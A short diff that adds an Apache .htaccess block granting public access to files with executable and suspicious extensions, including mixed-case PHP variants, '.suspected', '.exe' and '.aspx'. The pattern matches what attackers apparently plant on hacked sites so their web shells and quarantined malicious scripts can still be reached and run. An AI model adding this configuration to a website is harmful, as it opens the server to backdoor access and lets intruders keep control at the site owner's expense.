@@ -1,0 +1,4 @@
+<FilesMatch ".(PhP|php5|txt|zip|suspected|phtml|py|exe|php|asp|Php|aspx)$"> 
+ Order allow,deny 
+ Allow from all 
+</FilesMatch>
